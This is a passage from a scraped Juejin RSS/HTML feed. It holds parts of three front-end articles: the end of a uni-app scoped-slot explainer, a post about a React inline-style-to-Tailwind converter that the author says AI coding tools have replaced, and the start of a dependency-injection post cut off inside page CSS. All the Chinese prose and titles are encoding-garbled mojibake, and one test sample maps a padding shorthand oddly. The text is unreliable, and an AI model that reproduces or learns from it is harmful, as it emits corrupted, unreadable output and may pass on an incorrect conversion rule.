<pre><code class="hljs language-HTML" lang="HTML"><span class="hljs-tag">&lt;<span class="hljs-name">Swiper</span> <span class="hljs-attr">:list</span>=<span class="hljs-string">"dataList"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">v-slot:content</span>=<span class="hljs-string">"{ item }"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">:src</span>=<span class="hljs-string">"item.url"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">Swiper</span>&gt;</span>
</code></pre>
<hr/>
<h3 data-id="heading-4">å››ã€ ä¸ºä»€ä¹ˆæ¢æˆä½œç”¨åŸŸæ’æ§½å°±ç”Ÿæ•ˆäº†ï¼Ÿ</h3>
<p>è¿™æ˜¯åº•å±‚æ¶æ„çš„è´¨å˜ï¼š</p>
<ul>
<li><strong>å®ä¾‹åŒ–æ—¶æœºæ”¹å˜</strong>ï¼šä½œç”¨åŸŸæ’æ§½åœ¨å°ç¨‹åºé‡Œè¢«ç¼–è¯‘ä¸º <code>template</code> é€»è¾‘ã€‚<strong>å®ä¾‹åŒ–å†…å®¹çš„æ§åˆ¶æƒç§»äº¤ç»™äº†å­ç»„ä»¶</strong>ã€‚</li>
<li><strong>æŒ‰éœ€ç”Ÿæˆ</strong>ï¼šåªæœ‰å­ç»„ä»¶è¿è¡Œåˆ° <code>v-if="true"</code> ä¸”æ‰§è¡Œåˆ° <code>&lt;slot /&gt;</code> é‚£ä¸€è¡Œä»£ç æ—¶ï¼Œçˆ¶ç»„ä»¶å®šä¹‰çš„â€œæ¨¡æ¿â€æ‰ä¼šåŠ¨æ€è½¬å˜ä¸ºçœŸæ­£çš„ DOMã€‚</li>
<li><strong>åœ°åŸºéƒ½æ²¡äº†</strong>ï¼šå¦‚æœ <code>v-if="false"</code>ï¼Œè¿™æ®µä»£ç å‹æ ¹ä¸ä¼šè·‘ï¼Œçˆ¶ç»„ä»¶çš„å†…å®¹åœ¨å†…å­˜é‡Œè¿å½±å­éƒ½ä¸ä¼šå‡ºç°ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-5">äº”ã€ é¿å‘å°ç»“</h3>
<p>å¦‚æœä½ åœ¨ Uni-app å¼€å‘è€…å·¥å…·é‡Œå‘ç° DOM èŠ‚ç‚¹æ•°ä¸å¯¹åŠ²ï¼Œè¯·æ£€æŸ¥ä»¥ä¸‹ä¸¤ç‚¹ï¼š</p>
<ol>
<li><strong>æ˜¯å¦åœ¨å¾ªç¯é‡Œç”¨äº†åŠ¨æ€å…·åæ’æ§½ï¼Ÿ</strong> ï¼ˆ<code>:name="'xxx' + index"</code>ï¼‰</li>
<li><strong>çˆ¶ç»„ä»¶æ˜¯å¦ä¹Ÿå†™äº† <code>v-for</code> å»å¡«å‘ï¼Ÿ</strong></li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸‰å¹´å‰å†™çš„ä¸€ä¸ªä»£ç å·¥å…·ï¼Œè‡³ä»Šå·²è¢« AI Coding å®Œå…¨å–ä»£ã€‚]]></title>    <link>https://juejin.cn/post/7589074117644271651</link>    <guid>https://juejin.cn/post/7589074117644271651</guid>    <pubDate>2025-12-29T09:22:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589074117644271651" data-draft-id="7588971908226973730" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸‰å¹´å‰å†™çš„ä¸€ä¸ªä»£ç å·¥å…·ï¼Œè‡³ä»Šå·²è¢« AI Coding å®Œå…¨å–ä»£ã€‚"/> <meta itemprop="keywords" content="å‰ç«¯,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2025-12-29T09:22:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é©¬è‡´è‰¯"/> <meta itemprop="url" content="https://juejin.cn/user/3413334152193454"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸‰å¹´å‰å†™çš„ä¸€ä¸ªä»£ç å·¥å…·ï¼Œè‡³ä»Šå·²è¢« AI Coding å®Œå…¨å–ä»£ã€‚
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3413334152193454/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é©¬è‡´è‰¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T09:22:17.000Z" title="Mon Dec 29 2025 09:22:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<ul>
<li>ä»“åº“ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmapinxue%2Fsun-dock" target="_blank" title="https://github.com/mapinxue/sun-dock" ref="nofollow noopener noreferrer">github.com/mapinxue/suâ€¦</a></li>
<li>æ¼”ç¤ºï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmapinxue.github.io%2Fsun-dock%2Fapp%2Fdist%2F" target="_blank" title="https://mapinxue.github.io/sun-dock/app/dist/" ref="nofollow noopener noreferrer">mapinxue.github.io/sun-dock/apâ€¦</a></li>
<li>åŠŸèƒ½ï¼šåœ¨ React ä»£ç ä¸­å°† Inline style props å˜ä¸º Inline tailwind css.</li>
</ul>
</blockquote>
<h2 data-id="heading-0">åˆè¡·</h2>
<p>2022 å¹´åœ¨ momenta å®ä¹ çš„æ—¶å€™å°±ç»å¸¸å‘ç°ä¸€ä¸ªä»£ç é—®é¢˜ï¼Œå¤§å®¶ç¼–å†™çš„ä»£ç ä¸­ç»å¸¸å‡ºç° style props å’Œ tailwind css å¹¶å­˜çš„ç°è±¡ï¼Œå°±åƒæ˜¯ï¼š</p>
<pre><code class="hljs language-jsx" lang="jsx">&lt;div className=<span class="hljs-string">"inline-block"</span> style={{ <span class="hljs-attr">width</span>: <span class="hljs-number">300</span> }} /&gt;
</code></pre>
<p>è¿™ä¸ªç®€å•çš„ä»£ç å·²ç»æœ‰äº†ä¸¤ä¸ªé—®é¢˜ï¼š</p>
<ol>
<li>ä»£ç é£æ ¼ä¸ç»Ÿä¸€ã€‚å·²ç»å¼•å…¥äº† tailwind cssï¼Œåˆä½¿ç”¨ style props ä»…ä»…ä½œä¸ºæ ·å¼è€Œä¸æ˜¯å˜é‡</li>
<li>æ€»æ˜¯å¼•å‘é‡æ–°æ¸²æŸ“ã€‚style props ä½¿ç”¨çš„å­—é¢é‡ object <code>{ width: 300 }</code>, ä¼šåœ¨æ¯æ¬¡çˆ¶ç»„ä»¶é‡æ–°æ¸²æŸ“çš„æ—¶å€™å¼•å‘è¿™ä¸ªç»„ä»¶çš„é‡æ–°æ¸²æŸ“ã€‚å¦‚ä¸‹é¢è¿™ä¸ªä»£ç æ‰€ç¤ºï¼š</li>
</ol>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">const</span> <span class="hljs-title function_">CompA</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);
    
    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span> {count} <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setCount(count + 1)}&gt; +1 <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
            
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">width:</span> <span class="hljs-attr">300</span> }}&gt;</span>
                {/* è¿™é‡Œæ˜¯ä¸ªå·¨å¤§çš„ç»„ä»¶ */}
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/&gt;</span></span>
    )
}
</code></pre>
<p>ç¼–å†™ä¸€ä¸ª demoï¼Œå·¦è¾¹æ˜¯ç›´æ¥ä½¿ç”¨ object å­—é¢é‡ç¼–å†™çš„ react ç»„ä»¶ï¼Œå³è¾¹æ˜¯ç»è¿‡ useMemo å›ºåŒ–çš„ objectå­—é¢é‡ï¼Œå…¶åœ¨ç‚¹å‡»æŒ‰é’®åŠ ä¸€å¼•å‘é‡æ–°æ¸²æŸ“åï¼Œå·¦ä¾§ä¼šè·Ÿä¸ªé‡æ–°æ¸²æŸ“ï¼Œè€Œå³ä¾§åˆ™ä¿æŒé™æ€ä¸é‡æ–°æ¸²æŸ“ã€‚è¿è¡Œæ•ˆæœå¦‚å›¾æ‰€ç¤º</p>
<ul>
<li>demo: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmapinxue%2Freact-rerender-demo" target="_blank" title="https://github.com/mapinxue/react-rerender-demo" ref="nofollow noopener noreferrer">github.com/mapinxue/reâ€¦</a></li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23ee112d823e42c7b9c6eb7e0e09abc0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ams6Ie06Imv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767605348&amp;x-signature=KEfplpZ9aHSuIOeR4ZSvlFt3dfI%3D" alt="åŠ¨ç”».gif" loading="lazy"/></p>
<p>è¿™ä»…æ˜¯ä¸€ä¸ªæ¼”ç¤º demoï¼Œå½“çœŸæ­£è¿›å…¥ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œè¢«ç‰µè¿çš„ç»„ä»¶å¯èƒ½è§„æ¨¡æ¯”è¾ƒåºå¤§ï¼Œé‡æ–°æ¸²æŸ“å¯èƒ½å¯¼è‡´æ˜¾ç¤ºé¡µé¢è·³åŠ¨ã€ç™½å±ï¼Œä»¥åŠ<strong>æ™®éçš„æ€§èƒ½æŸå¤±å’Œæ€§èƒ½ä¼˜åŒ–å¤±è´¥</strong>ã€‚</p>
<h2 data-id="heading-1">è§£å†³åŠæ³•</h2>
<p>è¿™ä¸ªé—®é¢˜è§£å†³åŠæ³•çš„æ–‡å­—æè¿°å¦‚ä¸‹ï¼š</p>
<p>é¦–å…ˆï¼Œè¡Œ AST åˆ†æï¼Œå¾—åˆ°æ¯ä¸ªç»„ä»¶çš„æŠ½è±¡è¯­æ³•æ ‘æ•°æ®ã€‚<br/>
ç¬¬äºŒï¼Œéå†è¯­æ³•æ ‘ï¼ŒæŸ¥è¯¢æ¯ä¸ª Node ä¸Šæ˜¯å¦æœ‰ style objectã€‚<br/>
ç¬¬ä¸‰ï¼Œ<strong>å¯¹ Style Object ä¸­çš„ Properties è¿›è¡Œéå†å¹¶é€šè¿‡æŸäº›æ‰‹æ®µæ˜ å°„åˆ° Tailwind CSS string ä¸Šã€‚</strong><br/>
ç¬¬å››ï¼Œé‡æ„ ASTï¼Œåˆ é™¤ Style object, å¢åŠ  classNameã€‚<br/>
æœ€åï¼Œä¿å­˜æ–‡ä»¶ã€‚</p>
<hr/>
<p>ä¸Šè¿°æ­¥éª¤ä¸­æœ€å¤æ‚çš„æ˜¯ç¬¬ä¸‰æ­¥ï¼Œå…¶éœ€è¦è€ƒè™‘å¤šç§æƒ…å†µï¼š</p>
<ul>
<li>é™æ€æ˜ å°„</li>
<li>åŠ¨æ€æ˜ å°„</li>
<li>çŠ¶æ€ä¼ é€’</li>
</ul>
<p>å¯¹äºé™æ€æ˜ å°„ï¼Œå…¶å˜åŒ–ä¸ºï¼š</p>
<pre><code class="hljs language-tsx" lang="tsx">{ <span class="hljs-attr">textAlign</span>: <span class="hljs-string">"left"</span> }  -&gt; <span class="hljs-string">"text-left"</span>
</code></pre>
<p>å¯¹äºåŠ¨æ€æ˜ å°„ï¼Œå…¶å˜åŒ–ä¸ºï¼š</p>
<pre><code class="hljs language-tsx" lang="tsx">{ <span class="hljs-attr">marginLeft</span>: <span class="hljs-number">1</span> } or { <span class="hljs-attr">marginLeft</span>: <span class="hljs-string">'1px'</span> } -&gt; <span class="hljs-string">"ml-[1px]"</span>
</code></pre>
<p>å¯¹äºçŠ¶æ€ä¼ é€’ï¼Œå…¶åº”è¯¥ä¿ç•™ï¼Œä¸€èˆ¬å±•ç°å½¢å¼ä¸ºå˜é‡æˆ–è€…æ’å€¼ï¼š</p>
<pre><code class="hljs language-tsx" lang="tsx">{ <span class="hljs-attr">position</span>: <span class="hljs-string">'absolute'</span>, <span class="hljs-attr">top</span>: <span class="hljs-string">`<span class="hljs-subst">${topVar}</span>`</span> } -&gt; <span class="hljs-string">"absolute"</span> { <span class="hljs-attr">top</span>: <span class="hljs-string">`<span class="hljs-subst">${topVar}</span>`</span> }
</code></pre>
<hr/>
<p>æ‰€ä»¥åœ¨å½“æ—¶çš„æµ‹è¯•æ ·ä¾‹ä¸­æˆ‘æ˜¯è¿™æ ·å†™çš„ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> testSamples = [
    {
        <span class="hljs-attr">input</span>: <span class="hljs-string">`&lt;div style={{ textAlign: 'center' }} /&gt;;`</span>,
        <span class="hljs-attr">output</span>: <span class="hljs-string">`className="text-center"`</span>
    },
    {
        <span class="hljs-attr">input</span>: <span class="hljs-string">`&lt;div style={{ textAlign: false }} /&gt;;`</span>,
        <span class="hljs-attr">output</span>: <span class="hljs-string">`textAlign: false`</span>
    },
    {
        <span class="hljs-attr">input</span>: <span class="hljs-string">`&lt;div style={{ backgroudUnknow: 'black', textAlign: 'center'  }} /&gt;;`</span>,
        <span class="hljs-attr">output</span>: <span class="hljs-string">`className="text-center"`</span>
    },
    {
        <span class="hljs-attr">input</span>: <span class="hljs-string">`&lt;div style={{ padding: '2px' }} /&gt;;`</span>,
        <span class="hljs-attr">output</span>: <span class="hljs-string">`className="p-[2px]"`</span>
    },
    {
        <span class="hljs-attr">input</span>: <span class="hljs-string">`&lt;div style={{ padding: 2 }} /&gt;;`</span>,
        <span class="hljs-attr">output</span>: <span class="hljs-string">`className="p-[2px]"`</span>
    },
    {
        <span class="hljs-attr">input</span>: <span class="hljs-string">`&lt;div style={{ padding: '2px 4px 2px' }} /&gt;;`</span>,
        <span class="hljs-attr">output</span>: <span class="hljs-string">`className="pt-[2px] py-[4px] pb-[2px]"`</span>
    },
    {
        <span class="hljs-attr">input</span>: <span class="hljs-string">`&lt;div style={{ strokeWidth: 4 }} /&gt;`</span>,
        <span class="hljs-attr">output</span>: <span class="hljs-string">`className="stroke-width-4"`</span>
    },
    {
        <span class="hljs-attr">input</span>: <span class="hljs-string">`&lt;div style={{ strokeWidth: '4' }} /&gt;`</span>,
        <span class="hljs-attr">output</span>: <span class="hljs-string">`className="stroke-width-4"`</span>
    },
    {
        <span class="hljs-attr">input</span>: <span class="hljs-string">`&lt;div style={{ textAlign: 'center !important' }} /&gt;`</span>,
        <span class="hljs-attr">output</span>: <span class="hljs-string">`className="!text-center"`</span>
    },
    {
        <span class="hljs-attr">input</span>: <span class="hljs-string">`&lt;div style={{ padding: '100%', margin: 'calc(100%)' }} /&gt;`</span>,
        <span class="hljs-attr">output</span>: <span class="hljs-string">`className="p-[100%] m-[calc(100%)]"`</span>
    },
    {
        <span class="hljs-attr">input</span>: <span class="hljs-string">`&lt;div style={{ fontWeight: 500 }} /&gt;`</span>,
        <span class="hljs-attr">output</span>: <span class="hljs-string">`className="font-500"`</span>
    },
];
</code></pre>
<hr/>
<h2 data-id="heading-2">å¦‚ä»Š</h2>
<p>å¦‚ä»Šï¼Œä¸‰å¹´åå„ç§ AI coding å·¥å…·å±‚å‡ºä¸ç©·ï¼ŒClaude Code, Gemini Cli, ä»¥åŠå›½å†…çš„ Qwen Coderï¼Œéƒ½å¯ä»¥ä»…ç”¨ä¸€å¥æç¤ºè¯åšåˆ°ä¸Šè¿°çš„æ‰€æœ‰å·¥ä½œï¼š</p>
<pre><code class="hljs">å¸®æˆ‘æŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªé¡¹ç›®ï¼Œå¹¶å°†æ‰€æœ‰ç»„ä»¶ä¸­ä½¿ç”¨çš„ React Style Props åˆ‡æ¢ä¸º Tailwind cssï¼Œå¹¶è¾“å‡ºè¿™æ ·åšçš„å¥½å¤„ã€‚
</code></pre>
<p>æ ¹æ®ä½ çš„é¡¹ç›®å¤§å°ï¼Œä¹Ÿè®¸ 5-15 åˆ†é’Ÿåï¼Œå…¨éƒ¨çš„ä»£ç å·²ç»è¢«æ”¹é€ å®Œæˆäº†ï¼Œå¹¶ä¸” AI çš„æ”¹åŠ¨å¯èƒ½æ›´å…·æœ‰é€»è¾‘æ€§ã€‚</p>
<p>å¹¶ä¸”åœ¨ä½ ä½¿ç”¨ AI ç¼–å†™çš„ä»£ç ä¸­ï¼Œå¾ˆå°‘ä¼šå‡ºç°æ˜¯ä½¿ç”¨ React Style Props çš„æƒ…å†µäº†ã€‚</p>
<p>æˆ‘çš„è¿™ä¸ªå°é¡¹ç›®ä¹Ÿè¢«æ­£å¼çš„å®Œå…¨æ›¿ä»£äº†ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¾èµ–æ³¨å…¥ç³»ç»Ÿ]]></title>    <link>https://juejin.cn/post/7589082912588251179</link>    <guid>https://juejin.cn/post/7589082912588251179</guid>    <pubDate>2025-12-29T09:34:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589082912588251179" data-draft-id="7589099845186175012" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¾èµ–æ³¨å…¥ç³»ç»Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-29T09:34:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å€Ÿä¸ªç«er"/> <meta itemprop="url" content="https://juejin.cn/user/2225067265915783"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¾èµ–æ³¨å…¥ç³»ç»Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2225067265915783/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å€Ÿä¸ªç«er
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T09:34:10.000Z" title="Mon Dec 29 2025 09:34:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol 